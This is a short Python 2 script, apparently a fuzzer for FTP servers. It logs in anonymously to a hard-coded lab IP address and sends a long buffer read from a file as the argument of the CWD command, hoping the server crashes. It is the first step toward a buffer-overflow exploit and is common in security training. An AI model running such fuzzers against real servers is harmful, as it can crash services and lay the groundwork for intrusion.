import socket,sys
def ftp_test(ip,port):
    target = ip
    port = port
    with open('password.txt','r') as file:
        buffer = file.read()
    s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    try:
        connct = s.connect((target,port))
        print "[+] Connected!"
    except:
        print "[!] Connection Failed!"
        sys.exit(0)
    s.recv(1024)
    s.send('USER anonymous\r\n')
    s.recv(1024)
    s.send('PASS anonymous\r\n')
    s.recv(1024)
    print "[+] Sending buffer..."
    s.send('CWD'+buffer+'\r\n')
    try:
        s.recv(1024)
        print "[!] Fuzz failed!"
    except:
        print "[+] Maybe we find a bug!"

if __name__ == '__main__':
    ftp_test("192.168.80.140",21)
